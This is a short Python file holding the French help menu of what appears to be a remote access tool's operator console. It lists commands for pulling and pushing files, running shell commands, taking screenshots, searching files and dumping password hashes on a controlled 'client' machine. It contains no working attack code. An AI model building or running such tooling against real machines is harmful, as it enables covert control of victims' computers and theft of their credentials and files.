class CommandHelp:
    @staticmethod
    def get_help():
        # Le Help
        help_text = """
        Commandes disponibles:
        help - Affiche cette aide
        download <chemin du fichier que vous souhaitez téléchargez> - Télécharge un fichier du client
        upload <chemin de ton fichier> <chemin de la destination voulu> - Envoie un fichier au client
        shell <commande que vous souhaitez executer> - Exécute une commande shell sur le client
        ipconfig - Affiche la configuration réseau du client
        screenshot - Prend une capture d'écran du client
        search <nom du fichier> - Recherche un fichier sur le client, pas besoin de spécifier le chemin
        hashdump - Extrait les hachages de mot de passe du client
        sysinfo - Affiche les informations système du client
        exit, quit - Ferme la connexion
        """
        return help_text
